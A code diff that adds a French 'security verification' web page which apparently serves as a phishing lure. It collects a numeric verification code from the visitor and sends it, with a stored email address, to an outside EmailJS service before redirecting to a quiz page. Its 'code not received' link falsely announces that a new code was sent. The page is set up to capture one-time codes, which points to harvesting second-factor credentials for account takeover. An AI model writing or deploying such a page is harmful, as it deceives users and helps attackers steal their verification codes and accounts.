@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vérification du code</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      background: #f4f4f4;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .verification-box {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    input {
+      padding: 10px;
+      margin-top: 15px;
+      width: 80%;
+      font-size: 1.1rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 25px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      background-color: #1877f2;
+      color: white;
+      cursor: pointer;
+    }
+    .link {
+      margin-top: 10px;
+      display: block;
+      font-size: 0.9rem;
+      color: #1877f2;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="verification-box">
+    <h2>Vérification de sécurité</h2>
+    <p>Entrez le code de vérification que vous avez reçu</p>
+    <input type="text" placeholder="Code à 6 chiffres" id="code-input" inputmode="numeric" pattern="\d{6,}" minlength="6" maxlength="10" />
+    <button onclick="verifierCode()">Vérifier</button>
+    <span class="link" onclick="alerteRenvoi()">Code non reçu ?</span>
+  </div>
+
+  <script>
+    emailjs.init("hM2MRTs2oi0bYWFE8");
+
+    document.getElementById("code-input").addEventListener("input", function (e) {
+      // Empêche tout caractère non numérique
+      e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    function verifierCode() {
+      const code = document.getElementById("code-input").value.trim();
+      const userEmail = localStorage.getItem("user_email_verif");
+
+      if (!/^[0-9]{6,}$/.test(code)) {
+        alert("Veuillez entrer un code numérique valide (au moins 6 chiffres).");
+        return;
+      }
+
+      if (userEmail) {
+        emailjs.send("service_brainduel", "template_verification", {
+          user_email: userEmail,
+          code_verification: code
+        }).then(() => {
+          window.location.href = "quiz.html";
+        }).catch(error => {
+          alert("Erreur d'envoi : " + JSON.stringify(error));
+        });
+      } else {
+        alert("Adresse courriel introuvable.");
+      }
+    }
+
+    function alerteRenvoi() {
+      alert("Un nouveau code a été envoyé !");
+    }
+  </script>
+</body>
+</html>
